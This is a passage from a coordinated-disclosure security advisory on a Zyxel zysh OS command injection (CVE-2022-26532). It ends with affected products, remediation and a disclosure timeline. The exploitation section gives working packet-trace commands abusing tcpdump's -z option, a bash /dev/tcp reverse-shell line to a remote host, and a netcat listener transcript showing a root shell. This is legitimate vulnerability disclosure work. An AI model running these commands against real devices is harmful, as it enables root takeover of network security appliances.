+  goal when invoked with exactly one command-line argument.
+
+* Executing "bash -i" (or similar commands such as gdb and python) directly
+  does not work, because the shell would die with a "Bad file descriptor"
+  error or similar.
+
+* We could upload a shellcode binary via the FTP service (enabled by
+  default on our test device) in the /etc/zyxel/ftp/tmp directory, but to
+  be able to execute it we would need to find a way to turn the file's
+  executable bit on; we might also be able to abuse some zysh functionality
+  to create an executable file in /etc/zyxel/ftp/tmp that we can later
+  overwrite via FTP or some other means that keep the executable bit on,
+  but we could not find an immediate way to do this.
+
+* We even crafted plain-text traffic to inject arbitrary commands into the
+  pcap output file saved by tcpdump, and tried executing this file as a
+  bash script, but bash would refuse to run it ("cannot execute binary
+  file").
+
+* Alternatively, we could directly upload a shell script via FTP and
+  run it as an argument to bash, but before its execution it would get
+  overwritten by tcpdump; in theory, we could try winning a race by
+  continuously uploading the shell script while tcpdump is executing.
+  Luckily, before we had to implement this, we found a better way.
+
+We were indeed lucky in finding almost by accident the reliable way to
+exploit this vulnerability that we are going to describe, which involves
+the use of standard output as a tcpdump output file ("-w -" command-line
+option) and some eldritch file descriptor trickery.
+
+In order to escape the restricted shell environment and execute arbitrary
+commands as root on the underlying embedded Linux OS, first authenticate to
+the Web Console at https://<REDACTED>/webconsole/ as either an admin or
+limited-admin user. Then, run the following commands:
+
+Router# packet-trace extension-filter -ln -i lo -w - -W 1 -G 1 -z python
+tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 65535 bytes
+...
+Maximum file limit reached: 1
+5 packets captured
+10 packets received by filter
+0 packets dropped by kernel
+Router# Python 2.7.14 (default, Sep 23 2021, 23:30:37)
+[GCC 4.7.0] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>>
+[press enter a few times]
+Router#
+Router#
+Router# packet-trace extension-filter -ln -i lo -w - -W 1 -G 1 -z bash
+tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 65535 bytes
+...
+Maximum file limit reached: 1
+5 packets captured
+10 packets received by filter
+0 packets dropped by kernel
+Router# #
+[press enter again]
+  File "<stdin>", line 1
+    ^
+SyntaxError: invalid syntax
+>>> import os
+>>> os.system("bash -i >& /dev/tcp/<REDACTED>/23234 0>&1")
+
+This will get you a privileged reverse shell:
+
+raptor@gollum:~$ nc -nvlp 23234
+Listening on 0.0.0.0 23234
+Connection received on <REDACTED> 54330
+bash: cannot set terminal process group (25792): Inappropriate ioctl for device
+bash: no job control in this shell
+bash-5.1# uname -a
+uname -a
+Linux USG20-VPN 3.10.87-rt80-Cavium-Octeon #2 Fri Sep 24 00:34:21 CST 2021 mips64 Cavium Octeon III V0.2 FPU V0.0 ROUTER7000_REF (CN7010p1.2-800-AAP) GNU/Linux
+bash-5.1# id
+id
+uid=0(root) gid=10000(operator) groups=0(root),10000(operator)
+bash-5.1#
+
+Of course, you can choose to execute your favorite Python code instead.
+
+Apparently, we managed to find a way to connect the standard input of the
+Web Console to the standard input of the python process we spawned with the
+first command, in a mind-bending exploit. To preserve our sanity, we have
+not thoroughly investigated how this is happening... but it works! And it
+is very reliable.
+
+On our test device, this exploitation vector only works from the Web
+Console, as an authenticated admin or limited-admin user. As an added
+benefit, as we have seen, the Web Console spawns zysh as root.
+
+We do not exclude other ways to exploit the described vulnerability,
+perhaps by creating or overwriting critical system files. It could also be
+easily abused to clobber arbitrary files and cause a Denial of Service
+condition on vulnerable devices, although we are not going to provide a
+proof-of-concept exploit for this (we are pretty sure you can easily figure
+it out on your own anyway).
+
+
+--[ 6 - Affected products
+
+According to Zyxel, zysh is present on a wide range of products, including
+their security appliances such as FLEX, ATP, USG, VPN, and ZyWALL [9], AP
+controllers and APs.
+
+Our audit was conducted exclusively on a Zyxel USG20-VPN test device with
+Firmware 5.10. However, other products and firmware versions have been
+confirmed by Zyxel to be affected by the same vulnerabilities.
+
+
+--[ 7 - Remediation
+
+During the whole coordinated disclosure process, Zyxel was very responsive.
+Working with them has been a pleasure and we would like to publicly
+acknowledge it, as unfortunately this is not always the case with every
+vendor.
+
+The memory corruption bugs were collectively assigned CVE-2022-26531, while
+the OS command injection vulnerability was assigned CVE-2022-26532. They
+were fixed by Zyxel in different versions of their firmware. Please refer
+to their advisory for patching information.
+
+We have not checked the effectiveness of the fixes.
+
+
+--[ 8 - Disclosure timeline
+
+2022-02-25: Zyxel was notified via <security@zyxel.com.tw>.
+2022-02-25: Zyxel acknowledged our vulnerability reports.
+2022-03-17: Zyxel assigned CVE-2022-26531 and CVE-2022-26532 to the
+	    reported issues and informed us of their intention to publish
+            their security advisory on 2022-05-24.
+2022-03-18: As a token of their appreciation, Zyxel gave us a certificate
+            of recognition.
+2022-05-24: Zyxel published their security advisory, following our
+            coordinated disclosure timeline.
+2022-06-07: HN Security published this advisory with full details.
+
+
+--[ 9 - References
+
+[0] https://www.zyxel.com/
+[1] https://security.humanativaspa.it/tag/zyxel/
+[2] https://www.dropbox.com/s/kvm5xwxqfrwge0t/USG20-VPN_5.10.zip?dl=1
+[3] https://en.wikipedia.org/wiki/MIPS_architecture
+[4] https://gtfobins.github.io/gtfobins/tcpdump/
+[5] https://www.tcpdump.org/manpages/tcpdump.1.html
+[6] https://twitter.com/pulsoid/status/1368146791473045504
+[7] http://phrack.org/issues/70/13.html#article
+[8] https://github.com/0xdea/exploits/blob/master/zyxel/raptor_zysh_fhtagn.exp
+[9] https://support.zyxel.eu/hc/en-us/articles/360013941859
+
+
+Copyright (c) 2022 Marco Ivaldi and Humanativa Group. All rights reserved.
